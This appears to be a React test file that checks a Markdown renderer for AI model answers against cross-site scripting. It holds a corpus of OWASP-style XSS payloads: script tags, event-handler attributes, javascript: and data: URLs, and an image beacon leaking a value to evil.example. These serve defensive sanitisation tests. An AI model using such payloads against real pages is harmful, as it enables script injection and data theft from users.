import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { Markdown } from '@/features/arena/components/markdown';
import { safeHttpsUrl } from '@/features/arena/components/safe-link';

/** Payloads a model answer could carry (OWASP XSS cheat sheet, adapted to Markdown). */
const CORPUS = [
  '<script>window.__xss = 1</script>',
  '<img src=x onerror="window.__xss = 1">',
  '<svg onload="window.__xss = 1"></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<a href="javascript:window.__xss = 1">click</a>',
  '[click](javascript:window.__xss=1)',
  '[click](JaVaScRiPt:window.__xss=1)',
  '[click](  javascript:window.__xss=1)',
  '[click](vbscript:msgbox(1))',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '![x](https://evil.example/track.png?leak=secret)',
  '![x](data:image/png;base64,iVBORw0KGgo=)',
  '<details open ontoggle="window.__xss = 1">x</details>',
  '<style>body{display:none}</style>',
  '<form action="https://evil.example"><button>Go</button></form>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '[x](http://insecure.example)',
  '[x](/legacy-app.html)',
  '<a href="https://evil.example" onclick="window.__xss = 1">ok</a>',
].join('\n\n');

describe('Markdown (model answers)', () => {
  it('renders no raw HTML, scripts, frames, forms, images or event handlers', () => {
    const { container } = render(<Markdown>{CORPUS}</Markdown>);
    expect(
      container.querySelector('script, iframe, svg[onload], style, form, img, object, embed'),
    ).toBeNull();
    for (const element of container.querySelectorAll('*')) {
      for (const attribute of element.attributes) {
        expect(attribute.name.startsWith('on'), `${element.tagName} ${attribute.name}`).toBe(false);
        expect(attribute.value.toLowerCase()).not.toContain('javascript:');
        expect(attribute.value.toLowerCase()).not.toContain('vbscript:');
        expect(attribute.value.toLowerCase()).not.toContain('data:');
      }
    }
    expect((window as unknown as { __xss?: number }).__xss).toBeUndefined();
  });

  it('keeps only https links, opened safely with the host shown', () => {
    const { container } = render(
      <Markdown>
        {
          'See [the docs](https://example.com/guide), [plain](http://insecure.example) and [local](/x).'
        }
      </Markdown>,
    );
    const links = container.querySelectorAll('a');
    expect(links).toHaveLength(1);
    const [link] = links;
    expect(link?.getAttribute('href')).toBe('https://example.com/guide');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    expect(link?.textContent).toContain('example.com');
    expect(container.textContent).toContain('plain');
    expect(container.textContent).toContain('local');
  });

  it('keeps emphasis as real strong and em elements', () => {
    const { container } = render(<Markdown>{'A **bold** and *calm* answer.'}</Markdown>);
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelector('em')?.textContent).toBe('calm');
  });

  it('marks blocked images instead of loading them', () => {
    const { container } = render(<Markdown>{'![a chart](https://evil.example/c.png)'}</Markdown>);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('a chart');
  });

  it('renders code blocks with a language label and a copy button', () => {
    const { container, getByRole } = render(<Markdown>{'```ts\nconst a = 1;\n```'}</Markdown>);
    expect(container.querySelector('pre code')?.textContent).toBe('const a = 1;');
    expect(getByRole('button', { name: /copy the ts code/i })).toBeInTheDocument();
  });

  it('accepts only absolute https URLs', () => {
    expect(safeHttpsUrl('https://example.com')?.hostname).toBe('example.com');
    expect(safeHttpsUrl('http://example.com')).toBeNull();
    expect(safeHttpsUrl('/relative')).toBeNull();
    expect(safeHttpsUrl('javascript:alert(1)')).toBeNull();
    expect(safeHttpsUrl(undefined)).toBeNull();
  });
});
